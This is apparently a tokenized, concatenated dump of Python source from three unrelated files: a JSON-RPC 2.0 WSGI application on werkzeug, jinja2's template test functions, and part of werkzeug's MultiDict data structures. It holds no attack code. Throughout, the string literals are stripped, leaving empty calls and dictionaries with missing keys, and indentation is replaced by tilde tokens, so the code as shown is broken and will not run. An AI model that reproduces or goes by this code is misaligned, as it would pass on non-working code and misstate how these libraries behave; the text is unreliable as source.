"""\n:Copyright: (c) 2009 Takashi Matsuo <tmatsuo@candit.jp>,\n                     Atsushi Odagiri <aodagx@gmail.com>,\n                     All rights reserved.\n:license: BSD, see LICENSE for more details.\n\nhttp://groups.google.com/group/json-rpc/web/json-rpc-2-0\n\nerrors:\ncode \tmessage \tmeaning\n-32700 \tParse error \tInvalid JSON was received by the server.\nAn error occurred on the server while parsing the JSON text.\n-32600 \tInvalid Request \tThe JSON sent is not a valid Request object.\n-32601 \tMethod not found \tThe method does not exist / is not available.\n-32602 \tInvalid params \tInvalid method parameter(s).\n-32603 \tInternal error \tInternal JSON-RPC error.\n-32099 to -32000 \tServer error \tReserved for implementation-defined server-errors.\n\n""" \n 
\n 
PARSE_ERROR = - 32700 \n 
INVALID_REQUEST = - 32600 \n 
METHOD_NOT_FOUND = - 32601 \n 
INVALID_PARAMS = - 32602 \n 
INTERNAL_ERROR = - 32603 \n 
errors = { } \n 
errors [ PARSE_ERROR ] = "Parse Error" \n 
errors [ INVALID_REQUEST ] = "Invalid Request" \n 
errors [ METHOD_NOT_FOUND ] = "Method Not Found" \n 
errors [ INVALID_PARAMS ] = "Invalid Params" \n 
errors [ INTERNAL_ERROR ] = "Internal Error" \n 
\n 
try : \n 
~~~ import json \n 
~~ except ImportError : \n 
~~~ try : \n 
~~~ import django . utils . simplejson as json \n 
~~ except ImportError : \n 
~~~ import simplejson as json \n 
\n 
~~ ~~ import sys \n 
import logging \n 
import itertools \n 
\n 
from werkzeug import Request , Response \n 
from werkzeug import exceptions \n 
\n 
class JsonRpcApplication ( object ) : \n 
~~~ def __init__ ( self , methods = None ) : \n 
~~~ if methods is not None : \n 
~~~ self . methods = methods \n 
~~ else : \n 
~~~ self . methods = { } \n 
\n 
~~ ~~ def add_module ( self , mod , namespace = None ) : \n 
~~~ if namespace is None : \n 
~~~ namespace = mod . __name__ \n 
~~ for k , v in ( ( k , v ) for k , v in mod . __dict__ . iteritems ( ) \n 
if not k . startswith ( ) and callable ( v ) ) : \n 
~~~ self . add ( namespace + + k , v ) \n 
\n 
~~ ~~ def add ( self , name , func ) : \n 
~~~ self . methods [ name ] = func \n 
\n 
~~ def process ( self , data ) : \n 
~~~ if data . get ( ) != "2.0" : \n 
~~~ return { : , \n 
: data . get ( ) , \n 
: { : INVALID_REQUEST , \n 
: errors [ INVALID_REQUEST ] } } \n 
~~ if not in data : \n 
~~~ return { : , \n 
: data . get ( ) , \n 
: { : INVALID_REQUEST , \n 
: errors [ INVALID_REQUEST ] } } \n 
\n 
~~ methodname = data [ ] \n 
if not isinstance ( methodname , basestring ) : \n 
~~~ return { : , \n 
: data . get ( ) , \n 
: { : INVALID_REQUEST , \n 
: errors [ INVALID_REQUEST ] } } \n 
\n 
~~ if methodname . startswith ( ) : \n 
~~~ return { : , \n 
: data . get ( ) , \n 
: { : METHOD_NOT_FOUND , \n 
: errors [ METHOD_NOT_FOUND ] } } \n 
\n 
\n 
~~ if methodname not in self . methods : \n 
~~~ return { : , \n 
: data . get ( ) , \n 
: { : METHOD_NOT_FOUND , \n 
: errors [ METHOD_NOT_FOUND ] } } \n 
\n 
\n 
~~ method = self . methods [ methodname ] \n 
try : \n 
~~~ params = data . get ( , [ ] ) \n 
if isinstance ( params , list ) : \n 
~~~ result = method ( * params ) \n 
~~ elif isinstance ( params , dict ) : \n 
~~~ result = method ( ** dict ( [ ( str ( k ) , v ) for k , v in params . iteritems ( ) ] ) ) \n 
~~ else : \n 
~~~ return { : , \n 
: data . get ( ) , \n 
: { : INVALID_REQUEST , \n 
: errors [ INVALID_REQUEST ] } } \n 
~~ resdata = None \n 
if data . get ( ) : \n 
\n 
~~~ resdata = { \n 
: , \n 
: data . get ( ) , \n 
: result , \n 
} \n 
~~ return resdata \n 
~~ except Exception , e : \n 
~~~ return { : , \n 
: data . get ( ) , \n 
: { : INTERNAL_ERROR , \n 
: errors [ INTERNAL_ERROR ] , \n 
: str ( e ) } } \n 
\n 
\n 
~~ ~~ def __call__ ( self , environ , start_response ) : \n 
~~~ request = Request ( environ ) \n 
if request . method != "POST" : \n 
~~~ raise exceptions . MethodNotAllowed \n 
\n 
~~ if not request . content_type . startswith ( ) : \n 
~~~ raise exceptions . BadRequest \n 
~~ try : \n 
~~~ data = json . loads ( request . data ) \n 
~~ except ValueError , e : \n 
~~~ resdata = { : , \n 
: None , \n 
: { : PARSE_ERROR , \n 
: errors [ PARSE_ERROR ] } } \n 
\n 
~~ else : \n 
~~~ if isinstance ( data , dict ) : \n 
~~~ resdata = self . process ( data ) \n 
~~ elif isinstance ( data , list ) : \n 
~~~ if len ( [ x for x in data if not isinstance ( x , dict ) ] ) : \n 
~~~ resdata = { : , \n 
: None , \n 
: { : INVALID_REQUEST , \n 
: errors [ INVALID_REQUEST ] } } \n 
~~ else : \n 
~~~ resdata = [ d for d in ( self . process ( d ) for d in data ) \n 
if d is not None ] \n 
\n 
\n 
~~ ~~ ~~ response = Response ( content_type = "application/json" ) \n 
\n 
if resdata : \n 
~~~ response . headers [ "Cache-Control" ] = "no-cache" \n 
response . headers [ "Pragma" ] = "no-cache" \n 
response . headers [ "Expires" ] = "-1" \n 
response . data = json . dumps ( resdata ) \n 
~~ return response ( environ , start_response ) \n 
\n 
\n 
~~ ~~ def getmod ( modname ) : \n 
~~~ try : \n 
~~~ __import__ ( modname ) \n 
~~ except ImportError , e : \n 
~~~ logging . warn ( "import failed: %s." % e ) \n 
return None \n 
~~ mod = sys . modules [ modname ] \n 
return mod \n 
\n 
\n 
~~ def HTTPExceptionMiddleware ( app ) : \n 
~~~ def wrap ( environ , start_response ) : \n 
~~~ try : \n 
~~~ return app ( environ , start_response ) \n 
~~ except exceptions . HTTPException , e : \n 
~~~ return e ( environ , start_response ) \n 
~~ ~~ return wrap \n 
\n 
~~ def make_application ( methods ) : \n 
~~~ app = JsonRpcApplication ( ) \n 
for name , value in methods . iteritems ( ) : \n 
~~~ if ":" in value : \n 
~~~ modname , funcname = value . split ( ":" , 1 ) \n 
mod = getmod ( modname ) \n 
if mod : \n 
~~~ app . add ( name , getattr ( mod , funcname ) ) \n 
~~ ~~ else : \n 
~~~ modname = value \n 
mod = getmod ( modname ) \n 
if mod : \n 
~~~ app . add_module ( mod , name ) \n 
~~ ~~ ~~ app = HTTPExceptionMiddleware ( app ) \n 
return app \n 
\n 
# -*- coding: utf-8 -*- \n 
~~ """\n    jinja2.tests\n    ~~~~~~~~~~~~\n\n    Jinja test functions. Used with the "is" operator.\n\n    :copyright: (c) 2010 by the Jinja Team.\n    :license: BSD, see LICENSE for more details.\n""" \n 
import re \n 
from jinja2 . runtime import Undefined \n 
\n 
# nose, nothing here to test \n 
__test__ = False \n 
\n 
\n 
number_re = re . compile ( ) \n 
regex_type = type ( number_re ) \n 
\n 
\n 
try : \n 
~~~ test_callable = callable \n 
~~ except NameError : \n 
~~~ def test_callable ( x ) : \n 
~~~ return hasattr ( x , ) \n 
\n 
\n 
~~ ~~ def test_odd ( value ) : \n 
~~~ """Return true if the variable is odd.""" \n 
return value % 2 == 1 \n 
\n 
\n 
~~ def test_even ( value ) : \n 
~~~ """Return true if the variable is even.""" \n 
return value % 2 == 0 \n 
\n 
\n 
~~ def test_divisibleby ( value , num ) : \n 
~~~ """Check if a variable is divisible by a number.""" \n 
return value % num == 0 \n 
\n 
\n 
~~ def test_defined ( value ) : \n 
~~~ """Return true if the variable is defined:\n\n    .. sourcecode:: jinja\n\n        {% if variable is defined %}\n            value of variable: {{ variable }}\n        {% else %}\n            variable is not defined\n        {% endif %}\n\n    See the :func:`default` filter for a simple way to set undefined\n    variables.\n    """ \n 
return not isinstance ( value , Undefined ) \n 
\n 
\n 
~~ def test_undefined ( value ) : \n 
~~~ """Like :func:`defined` but the other way round.""" \n 
return isinstance ( value , Undefined ) \n 
\n 
\n 
~~ def test_none ( value ) : \n 
~~~ """Return true if the variable is none.""" \n 
return value is None \n 
\n 
\n 
~~ def test_lower ( value ) : \n 
~~~ """Return true if the variable is lowercased.""" \n 
return unicode ( value ) . islower ( ) \n 
\n 
\n 
~~ def test_upper ( value ) : \n 
~~~ """Return true if the variable is uppercased.""" \n 
return unicode ( value ) . isupper ( ) \n 
\n 
\n 
~~ def test_string ( value ) : \n 
~~~ """Return true if the object is a string.""" \n 
return isinstance ( value , basestring ) \n 
\n 
\n 
~~ def test_number ( value ) : \n 
~~~ """Return true if the variable is a number.""" \n 
return isinstance ( value , ( int , long , float , complex ) ) \n 
\n 
\n 
~~ def test_sequence ( value ) : \n 
~~~ """Return true if the variable is a sequence. Sequences are variables\n    that are iterable.\n    """ \n 
try : \n 
~~~ len ( value ) \n 
value . __getitem__ \n 
~~ except : \n 
~~~ return False \n 
~~ return True \n 
\n 
\n 
~~ def test_sameas ( value , other ) : \n 
~~~ """Check if an object points to the same memory address than another\n    object:\n\n    .. sourcecode:: jinja\n\n        {% if foo.attribute is sameas false %}\n            the foo attribute really is the `False` singleton\n        {% endif %}\n    """ \n 
return value is other \n 
\n 
\n 
~~ def test_iterable ( value ) : \n 
~~~ """Check if it\'s possible to iterate over an object.""" \n 
try : \n 
~~~ iter ( value ) \n 
~~ except TypeError : \n 
~~~ return False \n 
~~ return True \n 
\n 
\n 
~~ def test_escaped ( value ) : \n 
~~~ """Check if the value is escaped.""" \n 
return hasattr ( value , ) \n 
\n 
\n 
~~ TESTS = { \n 
: test_odd , \n 
: test_even , \n 
: test_divisibleby , \n 
: test_defined , \n 
: test_undefined , \n 
: test_none , \n 
: test_lower , \n 
: test_upper , \n 
: test_string , \n 
: test_number , \n 
: test_sequence , \n 
: test_iterable , \n 
: test_callable , \n 
: test_sameas , \n 
: test_escaped \n 
} \n 
# -*- coding: utf-8 -*- \n 
"""\n    werkzeug.datastructures\n    ~~~~~~~~~~~~~~~~~~~~~~~\n\n    This module provides mixins and classes with an immutable interface.\n\n    :copyright: (c) 2010 by the Werkzeug Team, see AUTHORS for more details.\n    :license: BSD, see LICENSE for more details.\n""" \n 
import re \n 
import codecs \n 
import mimetypes \n 
\n 
from werkzeug . _internal import _proxy_repr , _missing , _empty_stream \n 
\n 
\n 
_locale_delim_re = re . compile ( ) \n 
\n 
\n 
def is_immutable ( self ) : \n 
~~~ raise TypeError ( % self . __class__ . __name__ ) \n 
\n 
\n 
~~ def iter_multi_items ( mapping ) : \n 
~~~ """Iterates over the items of a mapping yielding keys and values\n    without dropping any from more complex structures.\n    """ \n 
if isinstance ( mapping , MultiDict ) : \n 
~~~ for item in mapping . iteritems ( multi = True ) : \n 
~~~ yield item \n 
~~ ~~ elif isinstance ( mapping , dict ) : \n 
~~~ for key , value in mapping . iteritems ( ) : \n 
~~~ if isinstance ( value , ( tuple , list ) ) : \n 
~~~ for value in value : \n 
~~~ yield key , value \n 
~~ ~~ else : \n 
~~~ yield key , value \n 
~~ ~~ ~~ else : \n 
~~~ for item in mapping : \n 
~~~ yield item \n 
\n 
\n 
~~ ~~ ~~ class ImmutableListMixin ( object ) : \n 
~~~ """Makes a :class:`list` immutable.\n\n    .. versionadded:: 0.5\n\n    :private:\n    """ \n 
\n 
def __reduce_ex__ ( self , protocol ) : \n 
~~~ return type ( self ) , ( list ( self ) , ) \n 
\n 
~~ def __delitem__ ( self , key ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def __delslice__ ( self , i , j ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def __iadd__ ( self , other ) : \n 
~~~ is_immutable ( self ) \n 
~~ __imul__ = __iadd__ \n 
\n 
def __setitem__ ( self , key , value ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def __setslice__ ( self , i , j , value ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def append ( self , item ) : \n 
~~~ is_immutable ( self ) \n 
~~ remove = append \n 
\n 
def extend ( self , iterable ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def insert ( self , pos , value ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def pop ( self , index = - 1 ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def reverse ( self ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def sort ( self , cmp = None , key = None , reverse = None ) : \n 
~~~ is_immutable ( self ) \n 
\n 
\n 
~~ ~~ class ImmutableList ( ImmutableListMixin , list ) : \n 
~~~ """An immutable :class:`list`.\n\n    .. versionadded:: 0.5\n\n    :private:\n    """ \n 
\n 
__repr__ = _proxy_repr ( list ) \n 
\n 
\n 
~~ class ImmutableDictMixin ( object ) : \n 
~~~ """Makes a :class:`dict` immutable.\n\n    .. versionadded:: 0.5\n\n    :private:\n    """ \n 
\n 
def __reduce_ex__ ( self , protocol ) : \n 
~~~ return type ( self ) , ( dict ( self ) , ) \n 
\n 
~~ def setdefault ( self , key , default = None ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def update ( self , * args , ** kwargs ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def pop ( self , key , default = None ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def popitem ( self ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def __setitem__ ( self , key , value ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def __delitem__ ( self , key ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def clear ( self ) : \n 
~~~ is_immutable ( self ) \n 
\n 
\n 
~~ ~~ class ImmutableMultiDictMixin ( ImmutableDictMixin ) : \n 
~~~ """Makes a :class:`MultiDict` immutable.\n\n    .. versionadded:: 0.5\n\n    :private:\n    """ \n 
\n 
def __reduce_ex__ ( self , protocol ) : \n 
~~~ return type ( self ) , ( self . items ( multi = True ) , ) \n 
\n 
~~ def add ( self , key , value ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def popitemlist ( self ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def poplist ( self , key ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def setlist ( self , key , new_list ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def setlistdefault ( self , key , default_list = None ) : \n 
~~~ is_immutable ( self ) \n 
\n 
\n 
~~ ~~ class UpdateDictMixin ( object ) : \n 
~~~ """Makes dicts call `self.on_update` on modifications.\n\n    .. versionadded:: 0.5\n\n    :private:\n    """ \n 
\n 
on_update = None \n 
\n 
def calls_update ( name ) : \n 
~~~ def oncall ( self , * args , ** kw ) : \n 
~~~ rv = getattr ( super ( UpdateDictMixin , self ) , name ) ( * args , ** kw ) \n 
if self . on_update is not None : \n 
~~~ self . on_update ( self ) \n 
~~ return rv \n 
~~ oncall . __name__ = name \n 
return oncall \n 
\n 
~~ __setitem__ = calls_update ( ) \n 
__delitem__ = calls_update ( ) \n 
clear = calls_update ( ) \n 
pop = calls_update ( ) \n 
popitem = calls_update ( ) \n 
setdefault = calls_update ( ) \n 
update = calls_update ( ) \n 
del calls_update \n 
\n 
\n 
~~ class TypeConversionDict ( dict ) : \n 
~~~ """Works like a regular dict but the :meth:`get` method can perform\n    type conversions.  :class:`MultiDict` and :class:`CombinedMultiDict`\n    are subclasses of this class and provide the same feature.\n\n    .. versionadded:: 0.5\n    """ \n 
\n 
def get ( self , key , default = None , type = None ) : \n 
~~~ """Return the default value if the requested data doesn\'t exist.\n        If `type` is provided and is a callable it should convert the value,\n        return it or raise a :exc:`ValueError` if that is not possible.  In\n        this case the function will return the default as if the value was not\n        found:\n\n        >>> d = TypeConversionDict(foo=\'42\', bar=\'blub\')\n        >>> d.get(\'foo\', type=int)\n        42\n        >>> d.get(\'bar\', -1, type=int)\n        -1\n\n        :param key: The key to be looked up.\n        :param default: The default value to be returned if the key can\'t\n                        be looked up.  If not further specified `None` is\n                        returned.\n        :param type: A callable that is used to cast the value in the\n                     :class:`MultiDict`.  If a :exc:`ValueError` is raised\n                     by this callable the default value is returned.\n        """ \n 
try : \n 
~~~ rv = self [ key ] \n 
if type is not None : \n 
~~~ rv = type ( rv ) \n 
~~ ~~ except ( KeyError , ValueError ) : \n 
~~~ rv = default \n 
~~ return rv \n 
\n 
\n 
~~ ~~ class ImmutableTypeConversionDict ( ImmutableDictMixin , TypeConversionDict ) : \n 
~~~ """Works like a :class:`TypeConversionDict` but does not support\n    modifications.\n\n    .. versionadded:: 0.5\n    """ \n 
\n 
def copy ( self ) : \n 
~~~ """Return a shallow mutable copy of this object.  Keep in mind that\n        the standard library\'s :func:`copy` function is a no-op for this class\n        like for any other python immutable type (eg: :class:`tuple`).\n        """ \n 
return TypeConversionDict ( self ) \n 
\n 
~~ def __copy__ ( self ) : \n 
~~~ return self \n 
\n 
\n 
~~ ~~ class MultiDict ( TypeConversionDict ) : \n 
~~~ """A :class:`MultiDict` is a dictionary subclass customized to deal with\n    multiple values for the same key which is for example used by the parsing\n    functions in the wrappers.  This is necessary because some HTML form\n    elements pass multiple values for the same key.\n\n    :class:`MultiDict` implements all standard dictionary methods.\n    Internally, it saves all values for a key as a list, but the standard dict\n    access methods will only return the first value for a key. If you want to\n    gain access to the other values, too, you have to use the `list` methods as\n    explained below.\n\n    Basic Usage:\n\n    >>> d = MultiDict([(\'a\', \'b\'), (\'a\', \'c\')])\n    >>> d\n    MultiDict([(\'a\', \'b\'), (\'a\', \'c\')])\n    >>> d[\'a\']\n    \'b\'\n    >>> d.getlist(\'a\')\n    [\'b\', \'c\']\n    >>> \'a\' in d\n    True\n\n    It behaves like a normal dict thus all dict functions will only return the\n    first value when multiple values for one key are found.\n\n    From Werkzeug 0.3 onwards, the `KeyError` raised by this class is also a\n    subclass of the :exc:`~exceptions.BadRequest` HTTP exception and will\n    render a page for a ``400 BAD REQUEST`` if caught in a catch-all for HTTP\n    exceptions.\n\n    A :class:`MultiDict` can be constructed from an iterable of\n    ``(key, value)`` tuples, a dict, a :class:`MultiDict` or from Werkzeug 0.2\n    onwards some keyword parameters.\n\n    :param mapping: the initial value for the :class:`MultiDict`.  Either a\n                    regular dict, an iterable of ``(key, value)`` tuples\n                    or `None`.\n    """ \n 
\n 
# the key error this class raises.  Because of circular dependencies \n 
# with the http exception module this class is created at the end of \n 
# this module. \n 
KeyError = None \n 
\n 
def __init__ ( self , mapping = None ) : \n 
~~~ if isinstance ( mapping , MultiDict ) : \n 
~~~ dict . __init__ ( self , ( ( k , l [ : ] ) for k , l in mapping . iterlists ( ) ) ) \n 
~~ elif isinstance ( mapping , dict ) : \n 
~~~ tmp = { } \n 
for key , value in mapping . iteritems ( ) : \n 
~~~ if isinstance ( value , ( tuple , list ) ) : \n 
~~~ value = list ( value ) \n 
~~ else : \n 
~~~ value = [ value ] \n 
~~ tmp [ key ] = value \n 
~~ dict . __init__ ( self , tmp ) \n 
~~ else : \n 
~~~ tmp = { } \n 
for key , value in mapping or ( ) : \n 
~~~ tmp . setdefault ( key , [ ] ) . append ( value ) \n 
~~ dict . __init__ ( self , tmp ) \n 
\n 
~~ ~~ def __getstate__ ( self ) : \n 
~~~ return dict ( self . lists ( ) ) \n 
\n 
~~ def __setstate__ ( self , value ) : \n 
~~~ dict . clear ( self ) \n 
dict . update ( self , value ) \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ return self . iterkeys ( ) \n 
\n 
~~ def __getitem__ ( self , key ) : \n 
~~~ """Return the first data value for this key;\n        raises KeyError if not found.\n\n        :param key: The key to be looked up.\n        :raise KeyError: if the key does not exist.\n        """ \n 
if key in self : \n 
~~~ return dict . __getitem__ ( self , key ) [ 0 ] \n 
~~ raise self . KeyError ( key ) \n 
\n 
~~ def __setitem__ ( self , key , value ) : \n 
~~~ """Like :meth:`add` but removes an existing key first.\n\n        :param key: the key for the value.\n        :param value: the value to set.\n        """ \n 
dict . __setitem__ ( self , key , [ value ] ) \n 
\n 
~~ def add ( self , key , value ) : \n 
~~~ """Adds a new value for the key.\n\n        .. versionadded:: 0.6\n\n        :param key: the key for the value.\n        :param value: the value to add.\n        """ \n 
dict . setdefault ( self , key , [ ] ) . append ( value ) \n 
\n 
~~ def getlist ( self , key , type = None ) : \n 
~~~ """Return the list of items for a given key. If that key is not in the\n        `MultiDict`, the return value will be an empty list.  Just as `get`\n        `getlist` accepts a `type` parameter.  All items will be converted\n        with the callable defined there.\n\n        :param key: The key to be looked up.\n        :param type: A callable that is used to cast the value in the\n                     :class:`MultiDict`.  If a :exc:`ValueError` is raised\n                     by this callable the value will be removed from the list.\n        :return: a :class:`list` of all the values for the key.\n        """ \n 
try : \n 
~~~ rv = dict . __getitem__ ( self , key ) \n 
~~ except KeyError : \n 
~~~ return [ ] \n 
~~ if type is None : \n 
~~~ return list ( rv ) \n 
~~ result = [ ] \n 
for item in rv : \n 
~~~ try : \n 
~~~ result . append ( type ( item ) ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ ~~ return result \n 
\n 
~~ def setlist ( self , key , new_list ) : \n 
~~~ """Remove the old values for a key and add new ones.  Note that the list\n        you pass the values in will be shallow-copied before it is inserted in\n        the dictionary.\n\n        >>> d = MultiDict()\n        >>> d.setlist(\'foo\', [\'1\', \'2\'])\n        >>> d[\'foo\']\n        \'1\'\n        >>> d.getlist(\'foo\')\n        [\'1\', \'2\']\n\n        :param key: The key for which the values are set.\n        :param new_list: An iterable with the new values for the key.  Old values\n                         are removed first.\n        """ \n 
dict . __setitem__ ( self , key , list ( new_list ) ) \n 
\n 
~~ def setdefault ( self , key , default = None ) : \n 
~~~ """Returns the value for the key if it is in the dict, otherwise it\n        returns `default` and sets that value for `key`.\n\n        :param key: The key to be looked up.\n        :param default: The default value to be returned if the key is not\n                        in the dict.  If not further specified it\'s `None`.\n        """ \n 
if key not in self : \n 
~~~ self [ key ] = default \n 
~~ else : \n 
~~~ default = self [ key ] \n 
~~ return default \n 
\n 
~~ def setlistdefault ( self , key , default_list = None ) : \n 
~~~ """Like `setdefault` but sets multiple values.  The list returned\n        is not a copy, but the list that is actually used internally.  This\n        means that you can put new values into the dict by appending items\n        to the list:\n\n        >>> d = MultiDict({"foo": 1})\n        >>> d.setlistdefault("foo").extend([2, 3])\n        >>> d.getlist("foo")\n        [1, 2, 3]\n\n        :param key: The key to be looked up.\n        :param default: An iterable of default values.  It is either copied\n                        (in case it was a list) or converted into a list\n                        before returned.\n        :return: a :class:`list`\n        """ \n 
if key not in self : \n 
~~~ default_list = list ( default_list or ( ) ) \n 
dict . __setitem__ ( self , key , default_list ) \n 
~~ else : \n 
~~~ default_list = dict . __getitem__ ( self , key ) \n 
~~ return default_list \n 
\n 
~~ def items ( self , multi = False ) : \n 
~~~ """Return a list of ``(key, value)`` pairs.\n\n        :param multi: If set to `True` the list returned will have a\n                      pair for each value of each key.  Otherwise it\n                      will only contain pairs for the first value of\n                      each key.\n\n        :return: a :class:`list`\n        """ \n 
return list ( self . iteritems ( multi ) ) \n 
\n 
~~ def lists ( self ) : \n 
~~~ """Return a list of ``(key, value)`` pairs, where values is the list of\n        all values associated with the key.\n\n        :return: a :class:`list`\n        """ \n 
return list ( self . iterlists ( ) ) \n 
\n 
~~ def values ( self ) : \n 
~~~ """Returns a list of the first value on every key\'s value list.\n\n        :return: a :class:`list`.\n        """ \n 
return [ self [ key ] for key in self . iterkeys ( ) ] \n 
\n 
~~ def listvalues ( self ) : \n 
~~~ """Return a list of all values associated with a key.  Zipping\n        :meth:`keys` and this is the same as calling :meth:`lists`:\n\n        >>> d = MultiDict({"foo": [1, 2, 3]})\n        >>> zip(d.keys(), d.listvalues()) == d.lists()\n        True\n\n        :return: a :class:`list`\n        """ \n 
return list ( self . iterlistvalues ( ) ) \n 
\n 
~~ def iteritems ( self , multi = False ) : \n 
~~~ """Like :meth:`items` but returns an iterator.""" \n 
for key , values in dict . iteritems ( self ) : \n 
~~~ if multi : \n 
~~~ for value in values : \n 
~~~ yield key , value \n 
~~ ~~ else : \n 
~~~ yield key , values [ 0 ] \n 
\n 
~~ ~~ ~~ def iterlists ( self ) : \n 
~~~ """Return a list of all values associated with a key.\n\n        :return: a class:`list`\n        """ \n 
for key , values in dict . iteritems ( self ) : \n 
~~~ yield key , list ( values ) \n 
\n 
~~ ~~ def itervalues ( self ) : \n 
~~~ """Like :meth:`values` but returns an iterator.""" \n 
for values in dict . itervalues ( self ) : \n 
~~~ yield values [ 0 ] \n 
\n 
~~ ~~ def iterlistvalues ( self ) : \n 
~~~ """like :meth:`listvalues` but returns an iterator.""" \n 
for values in dict . itervalues ( self ) : \n 
~~~ yield list ( values ) \n 
\n 
~~ ~~ def copy ( self ) : \n 
~~~ """Return a shallow copy of this object.""" \n 
return self . __class__ ( self ) \n 
\n 
~~ def to_dict ( self , flat = True ) : \n 
~~~ """Return the contents as regular dict.  If `flat` is `True` the\n        returned dict will only have the first item present, if `flat` is\n        `False` all values will be returned as lists.\n\n        :param flat: If set to `False` the dict returned will have lists\n                     with all the values in it.  Otherwise it will only\n                     contain the first value for each key.\n        :return: a :class:`dict`\n        """ \n 
if flat : \n 
~~~ return dict ( self . iteritems ( ) ) \n 
~~ return dict ( self . lists ( ) ) \n 
\n 
~~ def update ( self , other_dict ) : \n 
~~~ """update() extends rather than replaces existing key lists.""" \n 
for key , value in iter_multi_items ( other_dict ) : \n 
~~~ MultiDict . add ( self , key , value ) \n 
\n 
~~ ~~ def pop ( self , key , default = _missing ) : \n 
~~~ """Pop the first item for a list on the dict.  Afterwards the\n        key is removed from the dict, so additional values are discarded:\n\n        >>> d = MultiDict({"foo": [1, 2, 3]})\n        >>> d.pop("foo")\n        1\n        >>> "foo" in d\n        False\n\n        :param key: the key to pop.\n        :param default: if provided the value to return if the key was\n                        not in the dictionary.\n        """ \n 
try : \n 
~~~ return dict . pop ( self , key ) [ 0 ] \n 
~~ except KeyError , e : \n 
~~~ if default is not _missing : \n 
~~~ return default \n 
~~ raise self . KeyError ( str ( e ) ) \n 
\n 
~~ ~~ def popitem ( self ) : \n 
~~~ """Pop an item from the dict.""" \n 
try : \n 
~~~ item = dict . popitem ( self ) \n 
return ( item [ 0 ] , item [ 1 ] [ 0 ] ) \n 
~~ except KeyError , e : \n 
~~~ raise self . KeyError ( str ( e ) ) \n 
\n 
~~ ~~ def poplist ( self , key ) : \n 
~~~ """Pop the list for a key from the dict.  If the key is not in the dict\n        an empty list is returned.\n\n        .. versionchanged:: 0.5\n           If the key does no longer exist a list is returned instead of\n           raising an error.\n        """ \n 
return dict . pop ( self , key , [ ] ) \n 
\n 
~~ def popitemlist ( self ) : \n 
~~~ """Pop a ``(key, list)`` tuple from the dict.""" \n 
try : \n 
~~~ return dict . popitem ( self ) \n 
~~ except KeyError , e : \n 
~~~ raise self . KeyError ( str ( e ) ) \n 
\n 
~~ ~~ def __repr__ ( self ) : \n 
~~~ return % ( self . __class__ . __name__ , self . items ( multi = True ) ) \n 
\n 
\n 
~~ ~~ class _omd_bucket ( object ) : \n 
~~~ """Wraps values in the :class:`OrderedMultiDict`.  This makes it\n    possible to keep an order over multiple different keys.  It requires\n    a lot of extra memory and slows down access a lot, but makes it\n    possible to access elements in O(1) and iterate in O(n).\n    """ \n 
__slots__ = ( , , , ) \n 
\n 
def __init__ ( self , omd , key , value ) : \n 
~~~ self . prev = omd . _last_bucket \n 
self . key = key \n 
self . value = value \n 
self . next = None \n 
\n 
if omd . _first_bucket is None : \n 
~~~ omd . _first_bucket = self \n 
~~ if omd . _last_bucket is not None : \n 
~~~ omd . _last_bucket . next = self \n 
~~ omd . _last_bucket = self \n 
\n 
~~ def unlink ( self , omd ) : \n 
~~~ if self . prev : \n 
~~~ self . prev . next = self . next \n 
~~ if self . next : \n 
~~~ self . next . prev = self . prev \n 
~~ if omd . _first_bucket is self : \n 
~~~ omd . _first_bucket = self . next \n 
~~ if omd . _last_bucket is self : \n 
~~~ omd . _last_bucket = self . prev \n 
\n 
\n 
~~ ~~ ~~ class OrderedMultiDict ( MultiDict ) : \n 
~~~ """Works like a regular :class:`MultiDict` but preserves the\n    order of the fields.  To convert the ordered multi dict into a\n    list you can use the :meth:`items` method and pass it ``multi=True``.\n\n    In general an :class:`OrderedMultiDict` is an order of magnitude\n    slower than a :class:`MultiDict`.\n\n    .. admonition:: note\n\n       Due to a limitation in Python you cannot convert an ordered\n       multi dict into a regular dict by using ``dict(multidict)``.\n       Instead you have to use the :meth:`to_dict` method, otherwise\n       the internal bucket objects are exposed.\n    """ \n 
\n 
# the key error this class raises.  Because of circular dependencies \n 
# with the http exception module this class is created at the end of \n 
# this module. \n 
KeyError = None \n 
\n 
def __init__ ( self , mapping = None ) : \n 
~~~ dict . __init__ ( self ) \n 
self . _first_bucket = self . _last_bucket = None \n 
if mapping is not None : \n 
~~~ OrderedMultiDict . update ( self , mapping ) \n 
\n 
~~ ~~ def __eq__ ( self , other ) : \n 
~~~ if not isinstance ( other , MultiDict ) : \n 
~~~ return NotImplemented \n 
~~ if isinstance ( other , OrderedMultiDict ) : \n 
~~~ iter1 = self . iteritems ( multi = True ) \n 
iter2 = other . iteritems ( multi = True ) \n 
try : \n 
~~~ for k1 , v1 in iter1 : \n 
~~~ k2 , v2 = iter2 . next ( ) \n 
if k1 != k2 or v1 != v2 : \n 
~~~ return False \n 
~~ ~~ ~~ except StopIteration : \n 
~~~ return False \n 
~~ try : \n 
~~~ iter2 . next ( ) \n 
~~ except StopIteration : \n 
~~~ return True \n 
~~ return False \n 
~~ if len ( self ) != len ( other ) : \n 
~~~ return False \n 
~~ for key , values in self . iterlists ( ) : \n 
~~~ if other . getlist ( key ) != values : \n 
~~~ return False \n 
~~ ~~ return True \n 
\n 
~~ def __ne__ ( self , other ) : \n 
~~~ return not self . __eq__ ( other ) \n 
\n 
~~ def __reduce_ex__ ( self , protocol ) : \n 
~~~ return type ( self ) , ( self . items ( multi = True ) , ) \n 
\n 
~~ def __getstate__ ( self ) : \n 
